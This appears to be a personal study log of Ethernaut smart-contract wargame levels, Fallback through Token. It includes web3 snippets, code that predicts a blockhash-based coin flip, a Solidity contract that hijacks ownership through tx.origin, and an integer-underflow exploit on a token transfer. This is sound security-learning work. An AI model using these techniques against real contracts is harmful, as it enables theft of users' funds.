# Ethernaut

### Level 2 - Fall Back

Date: 21-04-2026

Difficulty: Simple

Key Concepts Learned:

- About the `receive()` callback in contracts:
    - When `msg.data` is empty
    - Value is sent
    - The contract has a `receive` function
- How to call `receive`:
    
    ```jsx
    await web3.eth.sendTransaction({
      from: player,
      to: instance,
      value: "1000000000000000"
    })
    ```
    
- How to call a specific payable function with value:
    
    ```jsx
    await contract.myPayableFunction({
      value: ethers.utils.parseEther("0.01")
    })
    ```
    

---

### Level 3 - Fall out

Date: 21-04-2026

Difficulty: Very Simple

Key Learnings:

- Correct function names are most important, especially for constructors, which are mostly used for setting up owners and initial balances.

---

### Level 4 - Coin Flip

Date: 22-04-2026

Difficulty: Simple

Approach:

- At first sight, I didn't understand the math behind it. How could I predict the result? However, I had read somewhere that "randomness should not depend on blockhash because it is predictable," so I knew there was some logic behind it that I didn't yet understand.
- After researching, I understood the math. The logic used here always returns either `true` or `false` because we divide a `uint256` number by `2^255`.
- `guess = top_bit_of_previous_block_hash`

Challenges:

- I found a way to determine the guess by using the following code:

```jsx
let n = await web3.eth.getBlockNumber();
let prev = await web3.eth.getBlock(n);
let val = BigInt(prev.hash);
let FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968n;
let guess = (val / FACTOR) == 1n;
```

- However, after running this, I was manually making the contract call and then checking `consecutiveWins`, which caused my streak to break in between because of:
    - Wallet confirmation lag
    - Network congestion
    - Auto-mining interval
    - RPC latency
    - Manually pressing Enter repeatedly at uneven timing
- So, I tried making the call instantly through code, and then it worked.

Interesting!

---

### Level 4 - Telephone

Date: 22-04-2026

Difficulty: 

Key Learnings:

```markdown
tx.origin vs. msg.sender
------------------------

### Definition

-   **`tx.origin`**: The original wallet (Externally Owned Account) that signed the transaction. It remains the same no matter how many contracts are called in a chain.

-   **`msg.sender`**: The immediate caller of the current function. It changes every time one contract calls another.

### Usage

-   **Identification**: Used to track back to the person who started the execution.

-   **Contract Detection**: Sometimes used to block smart contracts from interacting with a function by checking `require(msg.sender == tx.origin)`.

### The Problem (Security Risk)

-   **Phishing Attacks**: If you use `tx.origin` to authorize a sensitive action (like `withdraw()`), an attacker can trick you into calling their malicious contract. Because you started the transaction, `tx.origin` will be your address, and the malicious contract will be able to drain your funds.

-   **Bad Authorization**: It ignores the "immediate" threat. A secure system should care about who is currently talking to it, not just who started the computer.

**Key Rule:** Never use `tx.origin` for authorization. Use `msg.sender` instead.
```

```jsx
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IContractTelephone {
    function changeOwner(address _owner) external;
}

contract HelperHarsh {
    address public owner = 0xF9bff54dB3CC429D98dd4b1b66D12f3D648C2b0A;
    
    constructor() {
        
    }

    function callTelephone(address _telephone) public {
        IContractTelephone(_telephone).changeOwner(owner);
    }
}
```

---

### Level 5 - Token

Date: 22-04-2026

Difficulty: Easy

Approach:

```jsx
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

- I knew the concepts of "overflow" and "underflow" in early versions of Solidity.
- So, I initialized my balance to 0 and transferred a value to address `x` with amount 30. Eventually, when it tried to do something like 20-30, I got a very large number due to underflow.